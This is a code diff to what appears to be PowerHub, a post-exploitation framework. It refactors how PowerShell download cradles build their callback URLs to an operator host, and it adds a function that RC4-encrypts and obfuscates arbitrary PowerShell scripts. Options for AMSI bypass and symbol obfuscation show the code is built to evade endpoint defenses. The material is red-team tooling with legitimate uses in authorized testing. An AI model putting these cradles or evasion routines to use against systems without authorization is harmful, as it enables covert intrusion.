@@ -6,9 +6,8 @@ import random
 import re
 import string
 
-from jinja2 import Environment, FileSystemLoader
-
-from powerhub.tools import encrypt_rc4, encrypt_aes
+from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key
+from powerhub.modules import sanitize_ps1
 from powerhub.directories import BASE_DIR
 from powerhub.env import powerhub_app as ph_app
 
@@ -18,24 +17,28 @@ log = logging.getLogger(__name__)
 symbol_list = {None: None}
 VARLIST = []
 
-callback_urls = {
-    'http': 'http://%s:%d/%s' % (
-        ph_app.args.URI_HOST,
-        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
-        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
-    ),
-    'https': 'https://%s:%d/%s' % (
-        ph_app.args.URI_HOST,
-        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
-        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
-    ),
-}
+
+def callback_urls():
+    return {
+        'http': 'http://%s:%d/%s' % (
+            ph_app.args.URI_HOST,
+            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
+            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
+        ),
+        'https': 'https://%s:%d/%s' % (
+            ph_app.args.URI_HOST,
+            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
+            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
+        ),
+    }
+
 
 # TODO consider https
-webdav_url = 'http://%s:%d/webdav' % (
-    ph_app.args.URI_HOST,
-    ph_app.args.LPORT,
-)
+def webdav_url():
+    return 'http://%s:%d/webdav' % (
+        ph_app.args.URI_HOST,
+        ph_app.args.LPORT,
+    )
 
 
 def build_cradle_https(get_args):
@@ -73,7 +76,7 @@ def build_cradle_webclient(get_args, key):
                        "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
 
-        url = callback_urls[get_args['Transport']]
+        url = callback_urls()[get_args['Transport']]
 
         query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
         if not get_args['ClipExec'] == 'none':
@@ -115,7 +118,7 @@ def build_cradle(get_args, key):
     result += build_cradle_webclient(get_args, key)
 
     result = result % dict(
-        url=callback_urls[get_args['Transport']],
+        url=callback_urls()[get_args['Transport']],
         transport=get_args['Transport'],
         amsi=get_args['Amsi'],
         key_var=key_var,
@@ -140,12 +143,12 @@ def build_cradle(get_args, key):
     return result
 
 
-def symbol_name(name, natural=False, refresh=False):
+def symbol_name(name, natural=False, refresh=False, debug=False):
     if refresh and name in symbol_list:
         del symbol_list[name]
 
     if name not in symbol_list:
-        if ph_app.args.DEBUG:
+        if debug:
             # In debug mode, don't obfuscate
             symbol_list[name] = name
         else:
@@ -180,7 +183,7 @@ def choose_random_name():
     return result
 
 
-def debug(msg, dbg=False):
+def debug_filter(msg, dbg=False):
     """This is a function for debugging statements in jinja2 templates"""
     if dbg:
         return msg + ";"
@@ -190,7 +193,9 @@ def debug(msg, dbg=False):
 # TODO add jinja include_randomize_whitespace
 # TODO add jinja powershell decoys
 
-def get_stage(key, context={}, stage3_files=[], stage3_strings=[]):
+def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
+              debug=False, natural=False):
+    from jinja2 import Environment, FileSystemLoader
 
     env = Environment(loader=FileSystemLoader(
         os.path.join(BASE_DIR, 'templates')
@@ -200,7 +205,8 @@ def get_stage(key, context={}, stage3_files=[], stage3_strings=[]):
         return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()
 
     env.filters['rc4encrypt'] = rc4encrypt
-    env.filters['debug'] = lambda msg: debug(msg, dbg=ph_app.args.DEBUG)
+    env.filters['debug'] = lambda msg: debug_filter(msg, dbg=debug)
+    env.globals['symbol_name'] = lambda name: symbol_name(name, natural=natural, debug=debug)
 
     stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))
 
@@ -223,7 +229,7 @@ def get_stage(key, context={}, stage3_files=[], stage3_strings=[]):
 
     result = stage1_template.render(**context)
 
-    if not ph_app.args.DEBUG:
+    if not debug:
         result = remove_leading_whitespace(result)
         result = remove_blank_lines(result)
 
@@ -241,3 +247,21 @@ def remove_blank_lines(text):
     ]
     result = '\n'.join(result)
     return result
+
+
+def obfuscate_file(fp_in, fp_out):
+    import magic
+
+    code = fp_in.read()
+
+    try:
+        code = code.decode()
+        file_type = magic.from_buffer(code)
+        code = sanitize_ps1(code, file_type)
+    except UnicodeError:
+        raise
+        # TODO wrap in ps1
+
+    key = generate_random_key(16)
+    output = get_stage(key, stage3_strings=[code])
+    fp_out.write(output)
